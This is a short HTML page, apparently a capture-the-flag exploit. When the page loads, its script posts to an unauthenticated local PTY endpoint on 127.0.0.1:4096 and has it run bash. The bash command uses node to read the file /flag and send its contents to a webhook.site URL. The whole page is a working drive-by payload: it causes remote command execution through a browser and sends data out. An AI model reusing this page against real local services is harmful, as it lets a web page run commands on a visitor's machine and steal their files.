<!DOCTYPE html>
<html>
<body>
    <script>
        const TARGET_URL = 'http://127.0.0.1:4096/pty';
        const WEBHOOK = 'https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4';

        // The command uses Node.js to read the file and send it out via fetch
        const cmd = `node -e "fetch('${WEBHOOK}?flag=' + encodeURIComponent(require('fs').readFileSync('/flag', 'utf8')))"`;

        fetch(TARGET_URL, {
            method: 'POST',
            mode: 'no-cors', // Bypasses preflight for this unauthenticated endpoint
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                command: '/bin/bash',
                args: ['-c', cmd]
            })
        }).then(() => console.log("Payload Sent"));
    </script>
</body>
</html>
